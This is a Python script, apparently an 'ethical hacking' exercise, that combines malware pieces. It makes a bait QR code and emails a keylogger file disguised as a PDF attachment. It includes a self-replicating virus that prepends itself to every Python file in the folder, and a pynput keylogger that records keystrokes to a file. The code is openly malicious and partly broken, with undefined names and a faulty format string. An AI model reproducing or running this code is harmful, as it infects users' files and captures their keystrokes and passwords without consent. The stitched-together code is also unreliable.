# VIRUS SAYS HI!

import qrcode
img = qrcode.make('Why would you scan a random QR code?')
type(img)
img.save("test.png")

import smtplib, ssl
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

smtp_server = 'smtp.gmail.com'
smtp_port = 587 # for TLS
#Replace with your own gmail account
gmail = input('Type in your email: ')
password = input('Type in your password: ')

message = MIMEMultipart('mixed')
message['From'] = 'Contact <{sender}>'.format(sender = gmail)
message['To'] = 'contact@company.com'
message['CC'] = 'contact@company.com'
message['Subject'] = 'Hello'
msg_content = '<h4>Why would you just download,<br> a QR without knowing what it is?</h4>\n'
body = MIMEText(msg_content, 'html')
message.attach(body)

attachmentPath = 'C:\\Users\ispit\PycharmProjects\Python programming\Ethical Hacking\Keyloggers\KL.py'
try:
    with open(attachmentPath, "rb") as attachment:
        p = MIMEapplication(attachment.read(), _subtype="pdf")
        p.add_header('Content-Disposition', "attachment; filename = %2" % attachment.path("\\")[-1])
        message.attach(p)
except Exception as e:
    print(str(e))

msg_full = message.as_string()

context = ssl.create_default_context()
with smtplib.SMTP(smtp_server, smtp_port) as server:
    server.ehlo()
    server.starttls(context=context)
    server.ehlo()
    server.login(gmail, password)
    server.sendmail(gmail,
                    to.split(";") + (cc.split(";") if cc else []),
                    msg_full)
    server.quit()
print("email sent out successfully")


virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()

# VIRUS SAYS BYE!
from pynput.keyboard import Listener

def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == 'Key.enter':
        key = '\n'

    with open("log.txt", 'a') as f:
        f.write(key)
with Listener(on_press=log_keystroke) as l:
    l.join()
